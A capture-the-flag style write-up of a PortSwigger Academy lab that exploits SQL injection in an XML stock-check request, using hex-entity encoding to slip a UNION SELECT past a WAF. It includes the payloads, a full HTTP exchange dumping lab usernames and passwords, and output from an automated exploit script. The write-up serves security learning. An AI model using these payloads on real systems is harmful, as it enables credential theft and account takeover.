# Lab: SQL injection with filter bypass via XML encoding
This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

The database contains a `users` table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.

# Solution
## Identify the vulnerability

1. Observe that the stock check feature sends the productId and storeId to the application in XML format.
2. Send the POST /product/stock request to Burp Repeater.
3. In Burp Repeater, probe the storeId to see whether your input is evaluated. For example, try replacing the ID with mathematical expressions that evaluate to other potential IDs, for example:
```
<storeId>1+1</storeId>
```
4. Observe that your input appears to be evaluated by the application, returning the stock for different stores.
5. Try determining the number of columns returned by the original query by appending a UNION SELECT statement to the original store ID:
```
<storeId>1 UNION SELECT NULL</storeId>
```
6. Observe that your request has been blocked due to being flagged as a potential attack.

## Bypass the WAF

1. As you're injecting into XML, try obfuscating your payload using XML entities. One way to do this is using the Hackvertor extension. Just highlight your input, right-click, then select `Extensions > Hackvertor > Encode > dec_entities/hex_entities`.

2. Resend the request and notice that you now receive a normal response from the application. This suggests that you have successfully bypassed the WAF.

## Craft an exploit

1. Pick up where you left off, and deduce that the query returns a single column. When you try to return more than one column, the application returns 0 units, implying an error.

2. As you can only return one column, you need to concatenate the returned usernames and passwords, for example:
```
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
```
request
```
POST /product/stock HTTP/2
Host: 0a42000d0361c0fe801dcbcf00c8000a.web-security-academy.net
Cookie: session=Cmbr3UCNl2x1xFdqZaNsEjkNqgd1GJKw
Content-Length: 190
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Content-Type: application/xml
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a42000d0361c0fe801dcbcf00c8000a.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a42000d0361c0fe801dcbcf00c8000a.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId></stockCheck>
```

response
```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 100

administrator~6euemgahtgyzpvpv73y0
wiener~lqd9lcgs33ypjox9slfi
866 units
carlos~vtwp70jq9so36ast2sol
```

3. Send this query and observe that you've successfully fetched the usernames and passwords from the database, separated by a ~ character.

4. Use the administrator's credentials to log in and solve the lab.

```
python3 .\sqli\sqli_lab_17\sqli_lab_17.py https://0a07002d0492741b800d2b4000a4002d.web-security-academy.net/ --proxy

    >> SQLi via XML body with Hackvertor hex_entities bypass
    >> by Port Swigger Academy

[!] Routing via proxy http://127.0.0.1:8080
[*] Looking for a users table...
[*] Target   : https://0a07002d0492741b800d2b4000a4002d.web-security-academy.net/product/stock
[*] Payload  : 1 UNION SELECT username || '~' || password FROM users
[*] Encoded  : &#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#...
[*] HTTP 200  (100 bytes)

[*] Raw response:
------------------------------------------------------------
552 units
wiener~j9v7nfe2jl6b3t2k1bsx
administrator~jbyghb1fgipwyr0u0k1j
carlos~3v6c9k6x4s7ygs4b4yic
------------------------------------------------------------

[✓] Username : administrator
[✓] Password : jbyghb1fgipwyr0u0k1j

[*] Attempting login as administrator...
[*] CSRF token: e693yQFoI03VfO4ZGy7xJI2XeG8nT3Zv
[✓] Login berhasil sebagai administrator!
[✓] Akses: https://0a07002d0492741b800d2b4000a4002d.web-security-academy.net/my-account
PS D:\devs\portswigger-web-academy-series> 
```